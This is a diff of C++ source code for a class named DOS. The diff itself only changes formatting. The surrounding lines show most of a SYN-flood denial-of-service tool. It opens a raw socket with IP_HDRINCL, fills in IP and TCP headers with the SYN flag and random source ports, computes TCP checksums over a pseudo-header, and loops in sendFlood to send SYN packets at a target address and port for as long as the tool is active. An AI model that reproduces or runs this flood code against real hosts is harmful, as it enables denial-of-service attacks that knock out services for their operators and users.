@@ -154,7 +154,8 @@ void DOS::init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseud
 	ip->proto = IPPROTO_TCP;
 	ip->checksum = 0;
 	ip->sourceIP = 0;
-	ip->destIP = inet_addr(this->m_dest_IP);
+	ip->destIP = inet_addr(this->m_dest_IP);
+
 	// TCP头部数据初始化
 	tcp->sport = htons(rand() % 16383 + 49152);
 	tcp->dport = htons(this->m_dest_Port);
@@ -164,7 +165,8 @@ void DOS::init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseud
 	tcp->flag = 0x02;
 	tcp->win = htons(2048);
 	tcp->sum = 0;
-	tcp->urp = 0;
+	tcp->urp = 0;
+
 	//TCP伪头部
 	pseudoheader->zero = 0;
 	pseudoheader->protocol = IPPROTO_TCP;
@@ -176,11 +178,13 @@ void DOS::init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseud
 unsigned short inline DOS::checksum(unsigned short *buffer, unsigned short size)
 {
 	unsigned long cksum = 0;
-	while (size > 1)	{
+	while (size > 1)
+	{
 		cksum += *buffer++;
 		size -= sizeof(unsigned short);
 	}
-	if (size)	{
+	if (size)
+	{
 		cksum += *(unsigned char *)buffer;
 	}
 	cksum = (cksum >> 16) + (cksum & 0xffff);
@@ -198,7 +202,8 @@ void DOS::createSocket()
 	{
 		perror("socket() \n");
 		exit(1);
-	}	int on = 1;
+	}
+	int on = 1;
 	// 设置IP选项 
 	if (setsockopt(this->m_socket, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
 	{
@@ -223,10 +228,13 @@ void *DOS::sendFlood(void *addr)
 	int len;
 	struct ip ip;			//IP头部
 	struct tcphdr tcp;		//TCP头部
-	struct pseudohdr pseudoheader;	//TCP伪头部
-	len = sizeof(struct ip) + sizeof(struct tcphdr);
+	struct pseudohdr pseudoheader;	//TCP伪头部
+
+	len = sizeof(struct ip) + sizeof(struct tcphdr);
+
 	/* 初始化头部信息 */
-	FLOOD->init_header(&ip, &tcp, &pseudoheader);
+	FLOOD->init_header(&ip, &tcp, &pseudoheader);
+
 	/* 处于活动状态时持续发送SYN包 */
 	while (FLOOD->m_alive)
 	{
@@ -241,7 +249,8 @@ void *DOS::sendFlood(void *addr)
 		bzero(buf, sizeof(buf));
 		memcpy(buf, &pseudoheader, sizeof(pseudoheader));
 		memcpy(buf + sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
-		tcp.sum = FLOOD->checksum((u_short *)buf, sizeof(pseudoheader) + sizeof(struct tcphdr));
+		tcp.sum = FLOOD->checksum((u_short *)buf, sizeof(pseudoheader) + sizeof(struct tcphdr));
+
 		bzero(sendbuf, sizeof(sendbuf));
 		memcpy(sendbuf, &ip, sizeof(struct ip));
 		memcpy(sendbuf + sizeof(struct ip), &tcp, sizeof(struct tcphdr));
